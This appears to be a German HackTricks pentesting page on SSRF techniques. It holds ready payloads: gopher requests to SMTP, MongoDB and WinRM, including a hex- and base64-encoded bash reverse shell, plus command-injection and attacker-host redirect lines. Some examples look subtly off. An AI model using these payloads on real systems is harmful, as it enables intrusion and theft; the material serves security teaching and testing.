# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Eine **Server-side Request Forgery (SSRF)**-Schwachstelle tritt auf, wenn ein Angreifer eine **serverseitige Anwendung** dazu manipuliert, **HTTP-Anfragen** an eine Domain seiner Wahl zu senden. Diese Schwachstelle setzt den Server willkürlichen externen Anfragen aus, die vom Angreifer gesteuert werden.

## SSRF erfassen

Das Erste, was du tun musst, ist, eine von dir ausgelöste SSRF-Interaktion zu erfassen. Um eine HTTP- oder DNS-Interaktion zu erfassen, kannst du Tools wie die folgenden verwenden:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Umgehung von Whitelisted Domains

Normalerweise wirst du feststellen, dass die SSRF nur in **bestimmten whitelisted Domains** oder URLs funktioniert. Auf der folgenden Seite findest du eine **Zusammenstellung von Techniken, um diese Whitelist zu umgehen**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

Wenn der Server korrekt geschützt ist, könntest du **alle Einschränkungen umgehen, indem du einen Open Redirect auf der Webseite ausnutzt**. Da die Webseite **SSRF auf dieselbe Domain** zulässt und wahrscheinlich **Redirects folgt**, kannst du den **Open Redirect ausnutzen, damit der Server auf interne Ressourcen zugreift**.\
Read more here: [https://portswigger.net/web-security/ssrf]

## Protokolle

- **file://**
- Das URL-Schema `file://` wird erwähnt und verweist direkt auf `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Das DICT-URL-Schema wird beschrieben und dient zum Zugriff auf Definitionen oder Wortlisten über das DICT-Protokoll. Ein Beispiel zeigt eine konstruierte URL, die auf ein bestimmtes Wort, eine Datenbank und eine Eintragsnummer abzielt, sowie eine Instanz eines PHP-Skripts, das möglicherweise missbraucht werden kann, um unter Verwendung vom Angreifer bereitgestellter Anmeldeinformationen eine Verbindung zu einem DICT-Server herzustellen: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Als Protokoll für sicheren Dateitransfer über Secure Shell identifiziert, zeigt ein Beispiel, wie ein PHP-Skript ausgenutzt werden könnte, um eine Verbindung zu einem bösartigen SFTP-Server herzustellen: `url=sftp://generic.com:11111/`
- **TFTP://**
- TFTP (Trivial File Transfer Protocol), das über UDP arbeitet, wird erwähnt; ein Beispiel zeigt ein PHP-Skript, das dazu gedacht ist, eine Anfrage an einen TFTP-Server zu senden. Eine TFTP-Anfrage wird an 'generic.com' auf Port '12346' für die Datei 'TESTUDPPACKET' gesendet: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Dieser Abschnitt behandelt das Lightweight Directory Access Protocol und betont seine Verwendung zur Verwaltung und zum Zugriff auf verteilte Verzeichnisdienste über IP-Netzwerke. Interagiere mit einem LDAP-Server auf localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Es wird eine Methode beschrieben, SSRF-Schwachstellen auszunutzen, um mit SMTP-Diensten auf localhost zu interagieren, einschließlich Schritten zur Aufdeckung interner Domain-Namen und weiterer Untersuchungsmaßnahmen auf Grundlage dieser Informationen.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Wenn SSRF von **curl** ausgeführt wird, hat curl eine Funktion namens [**URL globbing**](https://everything.curl.dev/cmdline/globbing), die nützlich sein kann, um WAFs zu umgehen. Zum Beispiel findest du in diesem [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) dieses Beispiel für eine **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Das Gopher-Protokoll kann IP, port und bytes für die Serverkommunikation angeben; außerdem werden Tools wie Gopherus und remote-method-guesser zum Erstellen von Payloads erwähnt. Zwei unterschiedliche Verwendungen werden dargestellt:

### Gopher://

Mit diesem Protokoll kannst du die **IP, port and bytes** angeben, die der Server **senden** soll. Damit kannst du im Grunde eine SSRF ausnutzen, um mit jedem TCP-Server zu **kommunizieren** (du musst allerdings vorher wissen, wie du mit dem Dienst sprechen musst).\
Glücklicherweise kannst du [Gopherus](https://github.com/tarunkant/Gopherus) verwenden, um Payloads für mehrere Dienste zu erstellen. Zusätzlich kann [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) verwendet werden, um _gopher_-Payloads für _Java RMI_-Dienste zu erstellen.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Erstelle Benutzer mit username=admin, password=admin123 und permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF über Referrer header & andere

Analytics-Software auf Servern protokolliert oft den Referrer header, um eingehende Links zu verfolgen — eine Praxis, die Anwendungen unbeabsichtigt für Server-Side Request Forgery (SSRF)-Schwachstellen öffnet. Das liegt daran, dass solche Software externe URLs, die im Referrer header genannt werden, besuchen kann, um den Inhalt der verweisenden Seite zu analysieren. Zur Aufdeckung dieser Schwachstellen wird das Burp Suite plugin "**Collaborator Everywhere**" empfohlen, da es ausnutzt, wie Analytics-Tools den Referer header verarbeiten, um potenzielle SSRF-Angriffsflächen zu identifizieren.

## SSRF über SNI-Daten aus dem Zertifikat

Eine Fehlkonfiguration, die die Verbindung zu beliebigen Backends durch eine einfache Einrichtung ermöglichen könnte, wird anhand einer Beispiel-Nginx-Konfiguration veranschaulicht:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In dieser Konfiguration wird der Wert aus dem Server Name Indication (SNI)-Feld direkt als Adresse des Backends verwendet. Diese Konfiguration macht die Anwendung anfällig für Server-Side Request Forgery (SSRF), die ausgenutzt werden kann, indem einfach die gewünschte IP-Adresse oder der Domainname im SNI-Feld angegeben wird. Ein Exploit-Beispiel, um eine Verbindung zu einem beliebigen Backend, wie z. B. `internal.host.com`, mit dem `openssl`-Befehl zu erzwingen, ist unten angegeben:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF über TLS AIA CA Issuers (Java mTLS)

Einige TLS-Stacks laden fehlende intermediate CAs automatisch über die **Authority Information Access (AIA) → CA Issuers** URI im Peer-Zertifikat herunter. In **Java** führt das Aktivieren von `-Dcom.sun.security.enableAIAcaIssuers=true` beim Betrieb eines mTLS-Services dazu, dass der Server attacker-kontrollierte URIs aus dem Client-Zertifikat **während des Handshakes** auflöst, bevor irgendwelche HTTP-Logik ausgeführt wird.

- **Requirements**: mTLS aktiviert, Java AIA-Fetching aktiviert, Angreifer kann ein Client-Zertifikat mit einer manipulierten AIA CA Issuers URI präsentieren.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Die Java certpath-Debug-Ausgabe zeigt `CertStore URI:http://localhost:8080`, und `nc` fängt die HTTP-Anfrage mit dem steuerbaren `User-Agent` aus `-Dhttp.agent` ab, was SSRF während der Zertifikatsvalidierung beweist.
- **DoS via file://**: Das Setzen der AIA CA Issuers auf `file:///dev/urandom` auf Unix-ähnlichen Hosts lässt Java dies als CertStore behandeln und unbeschränkt zufällige Bytes lesen, wodurch ein CPU-Kern ausgelastet bleibt und nachfolgende Verbindungen blockiert werden, selbst nachdem der Client die Verbindung getrennt hat.

## SSRF via CSS Pre-Processors

LESS ist ein populärer CSS pre-processor, der Variablen, Mixins, Funktionen und die mächtige `@import`-Direktive hinzufügt. Während der Kompilierung wird die LESS-Engine die in `@import`-Anweisungen referenzierten Ressourcen **abrufen** und deren Inhalte in das resultierende CSS einbetten ("inline"), wenn die `(inline)`-Option verwendet wird.

Check how to exploit it in:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget Datei-Upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF mit Command Injection

Es kann sich lohnen, eine Nutzlast wie diese zu versuchen: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF-Rendering

Wenn die Webseite automatisch ein PDF mit einigen von dir bereitgestellten Informationen erzeugt, kannst du **etwas JS einfügen, das vom PDF-Creator** selbst (dem Server) beim Erstellen des PDFs ausgeführt wird, und so SSRF missbrauchen. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Von SSRF zu DoS

Erstelle mehrere Sessions und versuche, über die SSRF aus den Sessions schwere Dateien herunterzuladen.

## SSRF PHP-Funktionen

Überprüfe die folgende Seite auf verwundbare PHP- und sogar Wordpress-Funktionen:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Weiterleitung zu Gopher

Für einige Exploits musst du möglicherweise eine **Redirect-Response senden** (potenziell um ein anderes Protokoll wie gopher zu verwenden). Hier findest du verschiedene python-Codes, um mit einem Redirect zu antworten:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Fehlkonfigurierte Proxies für SSRF

Tipps [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Verwundbarer Flask-Proxy-Code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask erlaubt die Verwendung von **`@`** als Anfangszeichen, wodurch man den **anfänglichen Hostnamen zum username** machen und einen neuen einschleusen kann. Angriffsanfrage:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Verwundbarer Code:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Es wurde entdeckt, dass es möglich ist, **den Pfad** einer Anfrage mit dem Zeichen **`;`** zu beginnen, was es erlaubt, anschließend **`@`** zu verwenden und einen neuen Host zum Zugriff einzuschleusen. Angriffsanfrage:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP integrierter Webserver <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Anfälliger PHP-Code</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP erlaubt die Verwendung des **Zeichens `*` vor einem Slash im Pfad** der URL, hat jedoch weitere Einschränkungen: Es kann nur für den Root-Pfadnamen `/` genutzt werden und Punkte `.` sind vor dem ersten Slash nicht erlaubt, weshalb beispielsweise eine dotless-hex encoded IP address verwendet werden muss:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Wenn du **Probleme** hast, **exfiltrate content from a local IP** wegen **CORS/SOP**, **DNS Rebidding** kann verwendet werden, um diese Einschränkung zu umgehen:

{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) ist ein Tool, um [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks durchzuführen. Es enthält die notwendigen Komponenten, um die IP-Adresse des attack server DNS name auf die target machine's IP address zu rebinden und attack payloads zu serve'n, um vulnerable software auf der target machine zu exploit'en.

Sieh dir auch den **öffentlich laufenden Server unter** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Voraussetzungen:

- **SSRF**
- **Outbound TLS sessions**
- **Dienste auf lokalen Ports**

Angriff:

1. Fordere den Benutzer/Bot auf, **Zugriff** auf eine **domain** herzustellen, die vom **attacker** kontrolliert wird.
2. Die **TTL** des **DNS** ist **0** sec (sodass das Opfer die IP der Domain bald erneut abfragen wird).
3. Eine **TLS connection** wird zwischen dem Opfer und der Domain des **attacker** aufgebaut. Der **attacker** bringt die **payload inside** die **Session ID or Session Ticket** ein.
4. Die **domain** startet eine **infinite loop** von Redirects gegen **himself**. Ziel ist, den Benutzer/Bot so lange auf die Domain zugreifen zu lassen, bis **again** eine **DNS request** für die Domain ausgeführt wird.
5. Bei der DNS request wird eine **private IP** address **now** angegeben (127.0.0.1 zum Beispiel).
6. Der Benutzer/Bot wird versuchen, die **reestablish the TLS connection** wiederherzustellen und dafür die **Session** ID/Ticket ID zu **send**en (in der die **payload** des **attacker** enthalten war). Herzlichen Glückwunsch — du hast es geschafft, den **user/bot attack himself** zu veranlassen.

Beachte, dass du während dieses Angriffs, wenn du localhost:11211 (_memcache_) angreifen möchtest, das Opfer die Initialverbindung zu www.attacker.com:11211 herstellen lassen musst (der **port must always be the same**).\
Um **diesen Angriff durchzuführen, kannst du das Tool** verwenden: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Für **mehr Informationen** siehe den Talk, in dem dieser Angriff erklärt wird: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Der Unterschied zwischen einem blind SSRF und einem nicht-blinden ist, dass du beim blind SSRF die Antwort der SSRF request nicht sehen kannst. Dadurch ist das Ausnutzen schwieriger, da du nur well-known vulnerabilities ausnutzen kannst.

### Time based SSRF

**Checking the time** der Server-Antworten kann es **possible to know if a resource exists or not** machen (vielleicht dauert es länger, auf eine existierende Ressource zuzugreifen als auf eine, die nicht existiert)

### From blid to full abusing status codes

Laut diesem [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), können einige blind SSRF auftreten, weil die targeted URL zwar mit einem 200 status code antwortet (wie z. B. AWS metadata), diese data aber nicht korrekt formatiert ist und die App sie daher möglicherweise nicht anzeigen will.

Es wurde jedoch festgestellt, dass das Senden bestimmter redirect responses von 305 bis 309 im SSRF dazu führen kann, dass die Anwendung **diesen Redirects folgt, während sie in einen Fehlermodus wechselt**, in dem das Format der Daten nicht mehr geprüft wird und diese einfach ausgegeben werden könnten.

The python server used to exploit this is th following:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Schritte:**
- Zuerst veranlasst 302 die App, dem Redirect zu folgen.
- Dann erhält sie 305 → 306 → 307 → 308 → 309 → 310.
- Nach dem 5. merkwürdigen Code gibt die PoC schließlich 302 → 169.254.169.254 → 200 OK zurück.

**Was im target passiert:**
- libcurl selbst folgt 305–310; es normalisiert unbekannte Codes einfach zu „follow“.
- Nach N seltsamen Redirects (≥ 5 hier) entscheidet der eigene Wrapper der Anwendung „something is off“ und wechselt in einen Fehlermodus, der fürs Debugging gedacht ist.
- In diesem Modus schreibt es die gesamte Redirect-Kette plus den finalen Body an den externen Caller zurück.
- Ergebnis: attacker sieht jeden Header + das metadata JSON — Ziel erreicht.

Beachte, dass dies interessant ist, um Statuscodes zu leak, die du vorher nicht leak konntest (wie z. B. ein 200). Allerdings, wenn du irgendwie auch den Statuscode der Antwort auswählen könntest (stell dir vor, du könntest entscheiden, dass die AWS metadata mit einem 500 Statuscode antwortet), **könnte es Statuscodes geben, die den Inhalt der Antwort direkt leak.**

### HTML-to-PDF-Renderer als blind SSRF-Gadgets

Bibliotheken wie **TCPDF** (und Wrapper wie **spipu/html2pdf**) holen automatisch alle URLs, die im attacker-kontrollierten HTML vorkommen, während sie ein PDF rendern. Jedes `<img>` oder `<link rel="stylesheet">`-Attribut wird serverseitig über cURL, `getimagesize()` oder `file_get_contents()` aufgelöst, sodass du den PDF-Worker dazu bringen kannst, interne Hosts zu sondieren, obwohl dir keine HTTP-Antwort reflektiert wird.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 führt mehrere Abrufversuche für jede `<img>`-Ressource durch, sodass eine einzelne payload mehrere requests erzeugen kann (hilfreich für timing-basierte Port-Scans).
- html2pdf übernimmt das Verhalten von TCPDF für `<img>` und fügt CSS-Fetching in `Css::extractStyle()` hinzu, das nach einer oberflächlichen Scheme-Prüfung einfach `file_get_contents($href)` aufruft. Missbrauche es, um loopback services, RFC1918 ranges oder cloud metadata endpoints anzusprechen.
- Kombiniere dieses SSRF-Primitive mit den [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal), um sowohl interne HTTP-Antworten als auch lokale Dateien, die in das PDF gerendert wurden, zu leaken.

